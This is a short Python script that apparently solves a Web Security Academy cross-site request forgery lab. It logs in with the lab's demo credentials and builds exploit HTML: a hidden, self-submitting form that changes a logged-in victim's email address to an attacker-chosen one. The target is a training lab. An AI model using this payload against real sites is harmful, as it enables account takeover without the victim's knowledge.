import requests
from bs4 import BeautifulSoup

site = 'acb91f261e2d5e96c0c6019600430093.web-security-academy.net'

login_url = f'https://{site}/login'
logindata = {
    'username' : 'wiener',
    'password' : 'peter'
}
# resp = requests.post(login_url, data=logindata)
resp = requests.post(login_url, data=logindata, headers={'referer' : f'https://{site}/login'})
print(f'HTTP status code: {resp.status_code} with response text {resp.text}')


exploit_html = f'''<html>
  <body>
  <form action="https://{site}/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@evil-user.net" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
  </body>
</html>'''
